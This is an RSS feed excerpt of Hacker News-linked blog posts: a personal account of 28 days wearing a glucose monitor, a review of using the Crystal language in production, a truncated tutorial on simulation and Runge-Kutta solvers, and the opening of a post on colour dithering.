my health. My curiosity for seeking ways to optimize my diet is what eventually led me to put a CGM on my arm.</span></p><h2>The Challenge</h2><p><span>I first learned about the 28-day </span><a href="https://www.wearablechallenge.com/"><span>Wearable Challenge</span></a><span> from following </span><a href="https://twitter.com/jwmares"><span>Justin Mares</span></a><span> on Twitter. I’ve followed Justin for quite a while since he knew a lot about the health-and-wellness space after founding two health food companies, </span><a href="https://www.kettleandfire.com/"><span>Kettle &amp; Fire</span></a><span> and </span><a href="https://perfectketo.com/"><span>Perfect Keto</span></a><span>.</span></p><p><span>In October, Justin shared an </span><a href="https://twitter.com/jwmares/status/1315696415213936641"><span>interesting tweet</span></a><span> about a weight-loss challenge that only required participants to track their blood glucose with a </span><a href="https://www.levelshealth.com/"><span>Levels</span></a><span> CGM. After reading the tweet, I knew this was something I had to try. Even though the challenge focused on weight loss, I enrolled immediately because I wanted to experiment with a CGM to see how my body reacts to my diet.</span></p><p><span>The challenge required me to keep my glucose levels below 120mg/dL even after a meal. For every day I went over, I’d lose $25 (talk about having skin in the game). The challenge started with a three-day grace period, so I could experiment with my diet to see how it impacted my glucose without getting penalized.</span></p><p><span>(For context, according to the</span><a href="https://www.idf.org/component/attachments/attachments.html?id=728&amp;task=download"> <span>International Diabetes Federation (IDF) guidelines</span></a><span>, your glucose values are “normal” if they stay below 140mg/dL after meals and return to pre-meal levels within two to three hours. Since this is a challenge geared towards weight loss, the upper limit was set slightly lower.)</span></p><p><b>Related article: </b><a href="https://www.levelshealth.com/blog/what-should-my-glucose-levels-be-ultimate-guide"><b>What should your glucose levels be? Here’s the ultimate guide to healthy blood sugar ranges</b></a></p><p><span>To help stay in the target range, each member of the challenge had access to a WhatsApp group chat to support each other. The group chat was a place for members to share what diet was working well, vent their frustrations when they failed, and provide a positive environment for motivation and encouragement. This aspect was less useful for me (I ended up muting it after a few days) because my goals were different. Still, I could see how much other members appreciated the accountability and support.</span></p><h2>What I Learned</h2><p><span>Overall, I found the challenge to be a learning experience filled with joyful moments of self-confirmation, times of utter disappointment, and a few surprises in between.</span></p><h3>The Good</h3><p><span>The best news was discovering that my typical breakfast of three eggs, bacon, and half an avocado drizzled in olive oil caused almost no glycemic response, nor did my afternoon snack of raw almonds. The app showed that these foods consistently hit a perfect score. Since I eat these foods most often, it was comforting knowing that I had a strong foundation.</span></p><p><img src="https://www.levelshealth.com/wp-content/uploads/2021/01/Breakfast-3.png" data-src="https://www.levelshealth.com/wp-content/uploads/2021/01/Breakfast-3.png" alt="" width="400" height="600" data-srcset="https://www.levelshealth.com/wp-content/uploads/2021/01/Breakfast-3.png 400w, https://www.levelshealth.com/wp-content/uploads/2021/01/Breakfast-3-267x400.png 267w, https://www.levelshealth.com/wp-content/uploads/2021/01/Breakfast-3-133x200.png 133w" data-sizes="(max-width: 400px) 100vw, 400px" srcset="https://www.levelshealth.com/wp-content/uploads/2021/01/Breakfast-3.png 400w, https://www.levelshealth.com/wp-content/uploads/2021/01/Breakfast-3-267x400.png 267w, https://www.levelshealth.com/wp-content/uploads/2021/01/Breakfast-3-133x200.png 133w"></p><p><span>The challenge also confirmed my belief that eating a low-carb paleo/keto-inspired diet consisting of mostly meat, vegetables, and healthy fats (olive oil, coconut oil, and butter/ghee) was optimal for maintaining consistent glucose levels.</span></p><p><img src="https://www.levelshealth.com/wp-content/uploads/2021/01/Almonds-3.png" data-src="https://www.levelshealth.com/wp-content/uploads/2021/01/Almonds-3.png" alt="" width="350" height="500" data-srcset="https://www.levelshealth.com/wp-content/uploads/2021/01/Almonds-3.png 350w, https://www.levelshealth.com/wp-content/uploads/2021/01/Almonds-3-280x400.png 280w, https://www.levelshealth.com/wp-content/uploads/2021/01/Almonds-3-140x200.png 140w" data-sizes="(max-width: 350px) 100vw, 350px" srcset="https://www.levelshealth.com/wp-content/uploads/2021/01/Almonds-3.png 350w, https://www.levelshealth.com/wp-content/uploads/2021/01/Almonds-3-280x400.png 280w, https://www.levelshealth.com/wp-content/uploads/2021/01/Almonds-3-140x200.png 140w"></p><p><span>Over the past four years, I’ve made a conscious effort to cook meals that avoid simple carbs, vegetable oils, and sweeteners, and it felt really good knowing I’d been making the right choices.</span></p><h3>The Not-So-Good</h3><p><span>The foods with the most considerable impact on my blood sugar were white rice and craft beer, although I can’t say I was surprised. Unfortunately, I love both of these things (so long Chipotle burrito bowls). It was disappointing to finally have to stare down the truth instead of continuing to live in willful ignorance.</span></p><p><img src="https://www.levelshealth.com/wp-content/uploads/2021/01/Chipotle-1.png" data-src="https://www.levelshealth.com/wp-content/uploads/2021/01/Chipotle-1.png" alt="" width="350" height="500" data-srcset="https://www.levelshealth.com/wp-content/uploads/2021/01/Chipotle-1.png 350w, https://www.levelshealth.com/wp-content/uploads/2021/01/Chipotle-1-280x400.png 280w, https://www.levelshealth.com/wp-content/uploads/2021/01/Chipotle-1-140x200.png 140w" data-sizes="(max-width: 350px) 100vw, 350px" srcset="https://www.levelshealth.com/wp-content/uploads/2021/01/Chipotle-1.png 350w, https://www.levelshealth.com/wp-content/uploads/2021/01/Chipotle-1-280x400.png 280w, https://www.levelshealth.com/wp-content/uploads/2021/01/Chipotle-1-140x200.png 140w"></p><p><span>I was also disappointed to learn how much sweet potato spikes my blood sugar. I knew sweet potatoes had a lower </span><a href="https://www.health.harvard.edu/diseases-and-conditions/glycemic-index-and-glycemic-load-for-100-foods"><span>glycemic index (GI)</span></a><span> than regular potatoes, but they still pushed me over the limit. I plan to keep them in my diet but will be more conscious about how often I eat them.</span></p><h3>The Surprising</h3><p><span>The biggest surprise of the challenge was discovering that quality tequila (G4 Reposado) had almost no effect on my blood sugar. Tequila that is 100% agave has zero carbs because of the distillation process (an average craft IPA has around 13g of carbs). Since beer is my usual go-to if I want a drink, I was happy to learn there was a healthier substitute I already enjoyed.</span></p><p><span>I also recognize I need to be careful here. Just because I didn’t experience a glucose spike doesn’t mean I didn’t have a biological response. </span><a href="https://academic.oup.com/ajcn/article/85/6/1545/4632987"><span>Research suggests</span></a><span> that alcohol decreases the liver’s ability to make new glucose, so it can trigger hypoglycemia, especially if you’re fasting or in a ketogenic state.</span></p><p><b>Related article: </b><a href="https://www.levelshealth.com/blog/alcohol-and-metabolic-fitness"><b>What does alcohol do to my glucose levels?</b></a></p><p><span>Another big surprise was discovering that my glucose levels aren’t just impacted by <em>what</em> I eat but also <em>when</em> I eat. I confirmed this because I meal prep twice a week to save time by eating the same meal multiple days in a row. (You may find that boring; I find it efficient.)</span></p><p><span>Eating the same thing for lunch and dinner on several challenge days was great for understanding how my body responds to food at different times of the day. All else being equal, my glucose spikes more after dinner than it does for lunch—sometimes by as much as 20mg/dL!</span></p><p><span>Even more surprising was noticing how little change there was from eating the same meal from day to day, but then having a large variance between lunch and dinner. I’m sure there’s a reason why, but I couldn’t tease a convincing explanation out of the data.</span></p><p><img src="https://www.levelshealth.com/wp-content/uploads/2021/01/Nov-11-1.png" data-src="https://www.levelshealth.com/wp-content/uploads/2021/01/Nov-11-1.png" alt="" width="350" height="500" data-srcset="https://www.levelshealth.com/wp-content/uploads/2021/01/Nov-11-1.png 350w, https://www.levelshealth.com/wp-content/uploads/2021/01/Nov-11-1-280x400.png 280w, https://www.levelshealth.com/wp-content/uploads/2021/01/Nov-11-1-140x200.png 140w" data-sizes="(max-width: 350px) 100vw, 350px" srcset="https://www.levelshealth.com/wp-content/uploads/2021/01/Nov-11-1.png 350w, https://www.levelshealth.com/wp-content/uploads/2021/01/Nov-11-1-280x400.png 280w, https://www.levelshealth.com/wp-content/uploads/2021/01/Nov-11-1-140x200.png 140w"></p><h2>What’s Changed</h2><p><span>Since the challenge ended, I’ve made a few adjustments to my diet. I’m not one to make radical changes (like cutting out a particular food from my diet forever), but now I’m more careful when I still want to splurge. Here are some of the changes I’ve made:</span></p><ul><li aria-level="1"><span>If I’m going to drink, I opt for quality spirits (neat or on the rocks) over craft beer or cocktails loaded with sugar.</span></li><li aria-level="1"><span>I’ve reconsidered the idea of a cheat day. I still plan on enjoying the occasional night of pizza and beer or tacos and margaritas, but a cheat day isn’t just a day. Now that I’m aware that the effects of an unhealthy meal can last for 2-3 days, I better make sure that the meal is worth it.</span></li><li aria-level="1"><span>I need to avoid any sweetened beverage, no matter how “healthy.”&nbsp; Smoothies, sweetened kombucha, and sweetened coffee wrecked my glucose levels, even though they’re often touted as healthy choices. Better to eat my sweets after a hearty meal than to drink them.</span></li><li aria-level="1"><span>I’m now more conscious of what I order when I eat out. For example, I opt for the salad at Chipotle instead of the burrito bowl. I’ve also switched to eating more sashimi instead of sushi to avoid eating as much rice.</span></li></ul><p><span>Even though the challenge only lasted 28 days, I learned more about my diet and lifestyle in those four weeks than I had from any previous blood test or book on dieting. The challenge confirmed that I already eat a healthy diet, but I need to make a few changes to ensure a healthy life for decades to come.</span></p><p><em><span>To learn more about the 28-day </span><a href="https://www.wearablechallenge.com/"><span>Wearable Challenge</span></a><span><a href="https://www.wearablechallenge.com/">, click here</a>.</span></em></p><p><em>Adapted from an original post <a href="https://lawsonblake.com/continuous-glucose-monitoring-levels-health/">here</a>.&nbsp;</em></p></div></div></div></section><section id="blog-single-content-related" data-ani-anchor=""></section></main>         </div>]]>
            </description>
            <link>https://www.levelshealth.com/blog/cgm-what-a-person-without-diabetes-learned-from-28-days-wearing-a-continuous-glucose-monitor</link>
            <guid isPermaLink="false">hacker-news-small-sites-26121447</guid>
            <pubDate>Sat, 13 Feb 2021 04:41:34 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[3 years of Crystal Lang programming: The good, the bad, the ugly]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 2 (<a href="https://news.ycombinator.com/item?id=26120995">thread link</a>) | @iomcr
<br/>
February 12, 2021 | https://anykeyh.hashnode.dev/3-years-of-crystal-lang-programming-the-good-the-bad-the-ugly | <a href="https://web.archive.org/web/*/https://anykeyh.hashnode.dev/3-years-of-crystal-lang-programming-the-good-the-bad-the-ugly">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="text"><p><img src="https://crystal-lang.org/assets/media/crystal_logo.svg" alt="Crystal Logo"></p>
<p>It's been more than three years since I've been hooked into Crystal Lang. For
those who don't know, Crystal promises to be able to write high-level code,
borrowing syntax from Ruby while adding strongly-typed yet inferred parameters
and avoiding the null exception problem. It also provides a complete and powerful <em>stdlib</em> and uses concepts from new generation languages like Go Lang. </p>
<p>Oh, and a powerful on-compile time macro system making runtime reflection obsolete! </p>
<p>Did it fulfill its promises? Yes. At some costs.</p>
<p>I started developing in Crystal Lang out of curiosity and pleasure, as I thought
this is a fun language to work with. 
Then I challenged myself to see what I was able to write, and it ended up with <em><a target="_blank" href="https://github.com/anykeyh/clear">Clear</a></em>, an ORM I've built from scratch.</p>
<p>Eventually, I started working on a booking platform. Getting free hands on the technical side, I decided to design the backend in Crystal. </p>
<p>Nine months later and an app finished, I can give some insight about using Crystal in a professional environment; the <strong>good</strong>, the <strong>bad</strong>, and the <strong>ugly</strong>, and how to develop an app in a language that is still considered confidential and in a pre-release state.</p>
<h2 id="the-good">The good</h2>
<p>Crystal kept its promise in being a very expressive language. It allowed me to
write clean high-level business code, allowing to lower the gap between clients
requirement and code syntax. Big <em>oui</em> here!</p>
<pre><code>
post <span>"/contact_us"</span> <span>do</span> <span>|env|</span>
  form = ContactUsForm.from_json(env.request.body.not_nil!)
  Mail.deliver ContactUsEmail.new(form.email, form.title, form.message)
<span>end</span>
</code></pre>
<p>The customer had some very complex rules when bookings were moved or canceled,
and I was aware that two teams of developers had given up on this project prior
to my work. </p>
<p>I decided to go for a Controller - Business Logic - Model 3-tier on
the backend and keep the View and Presentation on the frontend (using Typescript
and MithrilJS). </p>
<p>Because Crystal is strongly typed, the work to be done on spec
and coverage of the code is strongly reduced, in comparison to a Ruby or Python
code. </p>
<p>80% of the bugs occurring in those script languages have their root cause
laying in lose parameter type or nullable type. Both cases are covered at
compile time in Crystal. Basically, I wrote only 120 test cases on this
application, covering the different business cases of the user. In Ruby, for an
application of this scale, I would be around 250 to 400 tests.</p>
<p>At release, the application faced very few bugs. 
Some edges case we forgot with the client were failing. But so far, the compiler did an excellent job in preventing most of the bugs. </p>
<p>Because the language is compiled, it is wonderful to use within a Kubernetes cluster: The app starts in less than 200ms, allowing horizontal scaling, health-check and automatic restart of the app much more convenient than a big Rails application. </p>
<p>Memory usage is relatively low, peeking to ~250Mb and I never experienced any memory leak whatsoever. </p>
<p>And it runs fast. Really fast. For those who used to work with Rails, Django, or Laravel,
we are comparing snails with a cheetah there. </p>
<p>Actually, it runs so fast that I decided to do some complex data aggregation and transformation directly in Crystal instead of PostgreSQL.</p>
<h2 id="the-bad">The bad</h2>
<p>The major challenge I faced in keeping a good pace and being productive was the
compilation time. It takes around 20 seconds to compile/run spec on my i7 8750H.
We are talking of an app with ~9000 LOC, few shards (library), for a grand total
of probably less than 100k LOC. This compilation time is mostly due to the very
dynamic nature of Crystal lang, the work needed to be done at
compile-time  (<em> macro and type inference being the culprits </em>) , and the lack of
incremental compilation at the time of writing this article. 20 seconds seems
not much, but during a whole working day, it builds-up leading to a
non-negligible loss of productivity. For the defense of the language, the
problem is also at the developer level: it is just enough to lose focus, browse
few tabs on Reddit, check a video on Youtube, and can - too often! -  snowball
to minutes or more. Guilty I am!</p>
<p>Another challenge was the usage of the young library ecosystem. The language is
still confidential and some shards  (the name which is given to libraries in the Crystal
world) are not working with the latest version of Crystal, or lack of support,
as some authors just gave up on the language or have little to no time to
maintain them. 
I can't complain, as I am too responsible for this, as I gave little maintenance the last months over <a target="_blank" href="https://github.com/anykeyh/clear">Clear ORM</a>.</p>
<h2 id="the-ugly">The ugly?</h2>
<p>During development, I faced a few but worrying bugs, where the compiler was
literally crashing without any idea of where the problem came from. It also
happens that using some complex features of the language, like inheriting from
generic classes could lead to segfault during execution after a while. Issues
were raised and the Crystal Lang team fixed everything on short notice.</p>
<p>Since now, I'm not able to build the backend using <code>--release</code> flag due to
segfault at compile time. 
This is not a problem <em>per se</em>, as even without the optimization, the backend spends like 90% of its time waiting for PostgreSQL. </p>
<p>I still get a random crash of the application I gave up fixing for now.
Basically, the app can't access anymore to the PostgreSQL database after a
while.
This occurs on average between 3 to 30 days of running; I defined an
<code>/healthcheck</code> endpoint throwing a simple <code>SELECT 1</code>; to check the connection, called each second by Kubernetes.</p>
<p>With multiple pods redundancy, and thanks to low
memory foot-print and quick start-up time, pods defaulted got evicted and
recreated in a matter of seconds.</p>
<h2 id="conclusion">Conclusion</h2>
<p><strong>If I did this app using Rails, would have I been more productive?</strong></p>
<p>It's hard to say, as I spent quite a lot of time debugging, improving, and
maintaining Clear ORM within the scope of this project. I think the
productivity difference would have been negligible.</p>
<p>What you would win by having a strict compiler avoiding your hours of debugging 
and specs definition, you lose by the compile-time, the need to rewrite some 
basic functionality you could get via gems. </p>
<p><strong>Would I recommend people using Crystal?</strong></p>
<p>Yes, if:</p>
<ul>
<li>You are aware that something might break, as the ecosystem is still young.</li>
</ul>
<p>Avoiding monolithic application patterns will certainly reduce the compile-time
problems. Having micro-service architecture is a must-have if you want to
develop with Crystal, as each service will take much less time to compile, test
and deploy. </p>
<p>The low memory footprint and fast execution time fit perfectly with
this architecture. If you come from the Ruby world, you will feel at ease with
the syntax but will have to learn new design patterns of face issues with
compile-time or overly complex macro/code.
A common mistake is to try to use open hash, JSON, or collection to realize too late that strongly typed language doesn't like open structures</p>
<p><strong>Compared to Go Lang or Rust, how do Crystal fits?</strong> </p>
<p>Go Lang is very dull and <em>feels</em> austere in my opinion. It's not a bad
technology, but it feels not enough magical for my personal taste.
Rust is great but it remains less elegant to write business code with it. 
The magic Rust does with the memory still adds a burden in terms of readability,
with reference, lifecycle, and other symbols polluting the essence of the code
in my opinion. </p>
<p>Knowing that the Crystal Lang team is aware of most of the
problems above and working hard to release the v1.0 of the language, I'm
confident the language will know a bright future and all the traction it merits.</p>
</div></div>]]>
            </description>
            <link>https://anykeyh.hashnode.dev/3-years-of-crystal-lang-programming-the-good-the-bad-the-ugly</link>
            <guid isPermaLink="false">hacker-news-small-sites-26120995</guid>
            <pubDate>Sat, 13 Feb 2021 02:56:54 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Zen of Python: A Most in Depth Article]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26120869">thread link</a>) | @lumpa
<br/>
February 12, 2021 | https://www.pythonkitchen.com/zen-of-python-in-depth/ | <a href="https://web.archive.org/web/*/https://www.pythonkitchen.com/zen-of-python-in-depth/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to retrieve article]]>
            </description>
            <link>https://www.pythonkitchen.com/zen-of-python-in-depth/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26120869</guid>
            <pubDate>Sat, 13 Feb 2021 02:25:46 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How Simulations Work]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26120686">thread link</a>) | @janpaul123
<br/>
February 12, 2021 | http://www.anuncommonlab.com/articles/how-simulations-work/ | <a href="https://web.archive.org/web/*/http://www.anuncommonlab.com/articles/how-simulations-work/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div class="page"><h2>Intro</h2><p>People use computer simulations to both understand the world and design for it. Those who need to know where a satellite will be at some future time build simulations of the forces acting on the satellite and propagate its motion from some known location and velocity. Those who design robots create simulations of the environments their robots will experience in order to test how the robots make decisions and move. And those designing power plants simulate weather, energy demand, and system failures to determine the best design for a range of conditions and uncertainty.</p><p>However, despite the importance and widespread applicability, few receive education on the subject. The best information is scattered in places one might not know to look, and even most simulation textbooks are narrowly targeted to specific applications or tools. The inevitable result is that many simulations suffer from basic problems that have easy solutions.</p><p>This article will set out the critical aspects of building good simulations — that is, simulations that are accurate, easy to develop and analyze, and fast. The first sections deal with how a simulation evolves over time, as this is the core of any simulation. Further sections deal with details that make simulations easier to develop, faster, and applicable to a large number of variations. The target audience is engineers, scientists, and programmers, whether new to creating simulations or experienced. A tiny amount of vector math and calculus is assumed, making this text accessible to first- and second-year undergraduates. By the end, the reader should be able to begin building quality simulations, avoid common pitfalls, communicate the reasons for their decisions to peers, and know where to look for additional resources on specific topics and for the mathematical rigor behind it all.</p><p>We'll start with the motivation for understanding the core of how systems evolve over time.</p><h2 id="TToDt">From \(t\) to \(t+\Delta t\)</h2><p>Let’s get started with a really basic example. Let’s say we have a little moon orbiting a big planet. At some time, we know its position and velocity, and from this we want to simulate the future trajectory.</p><figure><img src="http://www.anuncommonlab.com/articles/how-simulations-work/img/moon_illustration.png"><figcaption>Planet and moon</figcaption></figure><p>We know the planet pulls on the moon with gravity, so the moon’s acceleration at any point in time is:</p><p>$$\vec{a}(t) = -\frac{GM}{r(t)^2} \hat{\vec{r}}(t)$$</p><p>Here, \(\vec{a}(t)\) is the acceleration vector, \(\vec{r}(t)\) is the position of the moon with respect to the center of mass of the planet, \(\hat{\vec{r}}\) denotes a unit vector in the direction of \(\vec{r}\), \(r\) denotes the magnitude of \(\vec{r}\), and \(GM\) is the gravitational constant of the planet (remember high school?). Let’s ignore all other forces that might act on the moon for now, since this is overwhelmingly the biggest. How do we turn this into a simulator? It might seem obvious: if we know \(\vec{r}(t)\) and \(\vec{v}(t)\) for some \(t\), then at some time later, \(t + \Delta t\), if \(\vec{v}\) and \(\vec{a}\) are nearly constant across this \(\Delta t\), we would have:</p><p>$$\vec{v}(t + \Delta t) \approx \vec{v}(t) + \vec{a}(t) \Delta t$$
$$\vec{r}(t + \Delta t) \approx \vec{r}(t) + \vec{v}(t) \Delta t + \frac{1}{2} \vec{a}(t) \Delta t^2$$</p><p>Perhaps by taking a series of small \(\Delta t\) and updating the position and velocity along the way, we'll generate the future trajectory. That certainly seems easy enough, so let's try it out. We'll pick a moon in a circular orbit about the planet. It has a period, \(T\), of 30 time units (we can call them days, but it doesn't really matter) and is located at 1 distance unit from the planet. Since it's a circular orbit, the velocity has magnitude of \(2 \pi / T\) and is perpendicular to the vector from the planet to the moon. Finally, \(GM = \left(\frac{2\pi}{T}\right)^2\). We'll take a series of time steps, each \(\Delta t\) in length. Let's use \(\Delta t\) = 1 time unit, so there should be 30 time steps in the orbit, bringing the moon exactly back to where it started. Here are the results using the “multiply by \(\Delta t\)” method above, plotted on top of the actual future trajectory.</p><figure><img src="http://www.anuncommonlab.com/articles/how-simulations-work/img/moon2.png"><figcaption>Initial simulation</figcaption></figure><p>It's not a very good circle. What went wrong?</p><p>Let's zoom in on the very first time step. Note that as the moon moves, the acceleration should change to always point towards the planet, but since we've assumed the acceleration is constant across \(\Delta t\), the acceleration in this step is always to the left in this figure. This doesn't affect the position all that much, but look at the velocity compared to the true velocity (since this system has a closed form solution, we can compare to an exact value for truth). The stepped velocity wasn't “pulled back” towards the planet enough (since it always pulled left). The result is that the moon is now going a little too fast and to the outside of the true trajectory. This image is not to scale so that we might better see the small difference in the two velocities at the upper left.</p><figure><img src="http://www.anuncommonlab.com/articles/how-simulations-work/img/moon1.png"><figcaption>First time step</figcaption></figure><p>As this continues, the velocity will always have a systematic error, leaning to the outside with every step. The error builds up rapidly, and so our simulated trajectory is not useful. Of course, we used a really big time step. Only 30 time steps for the whole trajectory? That seems ambitious. Let's cut the time step down by a factor of 2. And then by another factor of 2. And then again, again, again, and again.</p><figure><img src="http://www.anuncommonlab.com/articles/how-simulations-work/img/moon3.png"><figcaption>Multiple time steps</figcaption></figure><p>With our smallest time step above we're now taking 1920 time steps, and still the error is huge (given that these are planets).</p><p>Now let's fix it. Note that the stepped trajectory is always to the outside, no matter how small the time step. What if we used some method of stepping that wouldn't have this outward tendency? Something that would take a step, see that the new acceleration is significantly different from the acceleration of the previous step, and figure out what the acceleration was across the time step? Fortunately, some great mathematicians have figured out excellent, all-purpose ways to do this. For example, applying one of the most common and all-purpose methods (it's not tailored to orbits in any way), we can achieve less error than our most precise time step above with only 11 steps. Yes, 11. These are plotted as dots on top of the true trajectory below. Let's find out how.</p><figure><img src="http://www.anuncommonlab.com/articles/how-simulations-work/img/moon4.png"><figcaption>Multiple time steps with a much better solution</figcaption></figure><h2 id="ODEs">Ordinary Differential Equations</h2><p>First, we need to establish what types of things we're going to propagate. When we have systems with some <dfn>state</dfn> (like position and velocity) at some time and we calculate the derivatives of that state (velocity and acceleration for the example) at that time, we call this an <dfn>ordinary differential equation</dfn> (ODE) (and when we're dealing with motion, we call this the <dfn>equation of motion</dfn>). We usually stick all of the parts of the state together into a column matrix and call it the <dfn>state vector</dfn>.</p><p>$$ x(t) = \begin{bmatrix} \vec{r}(t) \\ \vec{v}(t) \end{bmatrix}$$</p><p>Then we have this for the time derivative:</p><p>$$ \frac{d x(t)}{dt} \equiv \dot{x}(t) = \begin{bmatrix} \vec{v}(t) \\ \vec{a}(t) \end{bmatrix}$$</p><p>Then we describe the ODE something like this:</p><p>$$ \dot{x}(t) = f(t, x(t))$$
which just states that the derivatives depend on time and the current state and nothing else. It's also common to drop the explicit dependence on time, because it's generally understood. For our example, we have:
$$ \dot{x} = f(x) = \begin{bmatrix} \vec{v} \\ -\frac{GM}{r^2} \hat{\vec{r}} \end{bmatrix} $$</p><p>When we're keeping track of position by simulating its acceleration, it's a <dfn>second-order system</dfn>, because acceleration is the second-derivative of position. However, in terms of the state vector, \(x\), it's a <dfn>first-order system</dfn> (we calculate \(\dot{x}\) and not \(\ddot{x}\)). This can cause confusion, so we should just remember that the system is ultimately second-order, and we're just conveniently packaging up everything into \(x\) so as to use first-order techniques on \(x\).</p><p>In general, \(f(x)\) is our model of something, which might be nonlinear and even stochastic. The only assumption we make about the whole system is that it's differentiable (smooth-ish). It probably doesn't have a closed-form solution or we'd use the closed-form solution instead of simulating (our circular orbit of course has a closed-form solution, but that's just so that we can compare our simulation to something exact).</p><p>We'll talk about other types of systems (things that aren't ODEs) later. For now, this gives us plenty of great material since a plethora of physical systems are described as ODEs that boil down to \(\dot{x} = f(x)\), such as equations of motion, chemical reactions, thermodynamics, population growth, etc. Having a generic framework to describe these systems therefore lets us describe the solvers in a generic way, making them applicable to a great number of different problems.</p><h2 id="FixedStep">Fixed-Step Solvers</h2><p>In the orbit example, we held the acceleration constant across the time step, and this ultimately created a systemic bias to one side. Of course, we could easily have seen that the acceleration wasn't constant across the time step. For instance, we could have propagated by one time step, re-calculated the acceleration, and used this updated value to determine how the acceleration had changed across the time step, allowing us to revise the step. Drawing from this motivation, an excellent solution was created by Carl Runge and Martin Wilhelm Kutta a long while back. They proposed taking a series of small steps forward, using the derivatives along the way to determine the effective derivatives across the entire time step in such a way that the errors could be made very, very small.</p><h3>Runge-Kutta Fourth Order Method</h3><p>The most common Runge-Kutta method is known as “the” fourth order method, and we'll call it RK4. It involves calculating the derivatives four times like so:</p><ol><li>First, calculate the derivative at \(t\), 
$$ k_1 = f(t, x(t)) $$</li><li>Form an intermediate update of the state, 
$$ x(t + \frac{1}{2} …</li></ol></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://www.anuncommonlab.com/articles/how-simulations-work/">http://www.anuncommonlab.com/articles/how-simulations-work/</a></em></p>]]>
            </description>
            <link>http://www.anuncommonlab.com/articles/how-simulations-work/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26120686</guid>
            <pubDate>Sat, 13 Feb 2021 01:39:25 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Ditherpunk 2 – beyond 1-bit]]>
            </title>
            <description>
<![CDATA[
Score 181 | Comments 56 (<a href="https://news.ycombinator.com/item?id=26120631">thread link</a>) | @makeworld
<br/>
February 12, 2021 | https://www.makeworld.gq/2021/02/dithering.html | <a href="https://web.archive.org/web/*/https://www.makeworld.gq/2021/02/dithering.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">
    <a rel="me" href="https://sunbeam.city/@makeworld"></a>
    <header>
        <h3><span>www.makeworld.gq</span></h3>
        <nav>
<a href="https://www.makeworld.gq/">Home</a>
<a href="https://www.makeworld.gq/about/">About</a>
<a href="https://www.makeworld.gq/blog/">Blog</a>

        </nav>
    </header>
    
    
    
    
    <p>Feb 12th, 2021<br>
by <strong>makeworld</strong></p>

<p><em>Last updated: Feb. 13, 2021</em></p>

<hr>

<p><em>This post contains some images that need to be viewed at 100% size to be seen correctly. If you normally browse
at a higher zoom level than 100%, please zoom out when you get to any of the images.</em></p>

<hr>

<p>Just yesterday, I released my <a href="https://github.com/makeworld-the-better-one/dither">dithering library</a>, written in Go.
It’s the product of many hours of research, experimentation, and refactoring. I’m
excited that it’s finally out, and to see what people create with it. Personally I’d like to create a CLI dithering
tool at some point that uses it.</p>

<p>Creating this library required research into the different algorithms for dithering, and how to implement them.
Unfortunately, not all of that knowledge is easily found. It’s spread across blog posts, Wikipedia pages without
citations, old books, and code comments. Recently, Surma wrote an article called
<a href="https://surma.dev/things/ditherpunk/">Ditherpunk — The article I wish I had about monochrome image dithering</a>.
It is an invaluable resource that combines lots of knowledge about dithering into one place. The main thing missing
from the post, however, is going beyond “monochrome”. Surma shows us how to dither with a 1-bit palette of black and
white, but what about more shades of gray? What about colour images? With this blog post I’d like to explore those
techniques, taking them out of my code and into English, so you can easily apply them elsewhere.</p>

<p><strong>First off, please read Surma’s post.</strong> It explains what dithering is, how it works, and many different algorithms.
I don’t feel the need to explain these again, but merely add on what I’ve learned.</p>

<h2 id="before-we-start">Before we start</h2>

<p>An HN commenter <a href="https://news.ycombinator.com/item?id=26122642">informed me</a> that you cannot accurately represent
linear RGB with just 8-bits (0-255), you need at least 12. Because of this, I have updated the blog post to use
16-bit color (0-65535), and will be updating the library shortly. Make sure you do this in your code too!</p>

<h2 id="overview">Overview</h2>

<p>Dithering operations consist of at least two steps, applied to each pixel. Sometimes there are further steps, like
“modify these nearby pixels”, but these are the basic ones.</p>

<ol>
  <li>Modify the pixel’s colour value.</li>
  <li>Find the colour in the palette that is “closest” to that modified value and use that on the output image.</li>
</ol>

<p>Now, we know from Surma’s post that step 1 must be done with linear RGB values. Otherwise, different values will be
affected differently – for example adding 5 to each colour won’t affect all colours the same way.</p>

<p>But what about step 2? How do we find the closest colour in the palette? In 1-bit dithering we don’t have to worry
about this, because anything above 0.5 is white, and anything below is black. But when your palette colours can be
anyhere in a 3D space, it is something that needs to be figured out.</p>

<p>Perhaps surprisingly, we’re not looking for a way that matches human perception. In fact, we are using Euclidean
distance with linear RGB values, which doesn’t match human perception at all! Why is this?
Thomas Mansencal (<a href="https://github.com/KelSolaar">@KelSolaar</a>) explains it best:</p>

<blockquote>
  <p>You can factor out the observer [the human] because what you are interested in here is basically energy
conservation. The idea being that for a given pool of radiant power emitters, if you remove a certain number of
them, by how much must the radiant power of the remaining ones be increased to be the same as that of the full
pool. It is really a ratio and doing those operations in a linear space is totally appropriate!</p>
</blockquote>

<p>This helped it click for me. Dithering can be thought of as trying to reconstruct the “radiant power” of the original
pixel colours, while restricted to a certain set of “emitters”, aka the palette colours. It is only with linearized
RGB values that we can properly measure the radiant power.</p>

<h2 id="random-noise-grayscale">Random Noise (grayscale)</h2>

<p>Random noise is a good one to start with, to show the differences between 1-bit dithering and larger palettes.</p>

<p>Surma does this by basically just adding a random number from -0.5 to 0.5, and then thresholding it.</p>

<div><div><pre><code><span>grayscaleImage</span><span>.</span><span>mapSelf</span><span>(</span><span>brightness</span> <span>=&gt;</span>
  <span>brightness</span> <span>+</span> <span>(</span><span>Math</span><span>.</span><span>random</span><span>()</span> <span>-</span> <span>0.5</span><span>)</span> <span>&gt;</span> <span>0.5</span> 
    <span>?</span> <span>1.0</span> 
    <span>:</span> <span>0.0</span>
